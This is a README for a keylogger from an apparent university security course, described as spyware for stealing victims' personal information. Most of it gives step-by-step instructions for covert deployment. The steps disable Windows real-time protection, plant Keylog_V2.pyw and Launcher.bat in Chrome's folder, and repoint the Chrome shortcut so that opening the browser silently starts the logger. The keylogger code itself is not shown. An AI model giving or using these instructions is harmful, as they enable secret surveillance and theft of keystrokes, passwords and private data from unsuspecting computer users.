# Keylogger
Keylogger - Application and System Security

Keylogger is a topic in the Application and System Security course, focusing on researching and developing spyware that monitors user keystrokes to steal victims' personal information.

## Requirements to run the program

- Turn off security software
- Install Python
- Install Python pynput library (pip install pynput)

## How to setup Keylogger

# Step 1: Disable Security Software (For Testing Purposes Only)
-> Open Windows Security → Go to Virus & Threat Protection.
-> Temporarily disable Real-time Protection to prevent security software from interfering with the test.
# Step 2: Locate the Target Application's Installation Folder
-> Right-click on the shortcut of an application (e.g., Chrome).
-> Select Open file location to open the folder containing the application's executable file.
# Step 3: Move the Keylogger Files to the Application Folder 
-> Copy the files Keylog_V2.pyw and Launcher.bat into the application's folder (e.g., the folder containing chrome.exe).
# Step 4: Edit Launcher.bat to Launch the Keylogger
-> Right-click on Launcher.bat → Select Edit in Notepad.
-> Add the paths to the target application's executable file on the first line, and the keylogger file on the second line, for example:
start "" "C:\Program Files\Google\Chrome\Application\chrome.exe"
start "" "C:\Program Files\Google\Chrome\Application\Keylog_V2.pyw"
-> Save the changes.
# Step 5: Update the Shortcut to Launch via Launcher.bat
-> Go back to the Desktop, right-click on the shortcut of the target application.
-> Select Properties → In the Target field, change the path to point to Launcher.bat.
-> Click Apply → OK to save the changes.

At this time, the user just needs to run the Chrome shortcut on the screen and KeyLogger will also be launched at the same time.

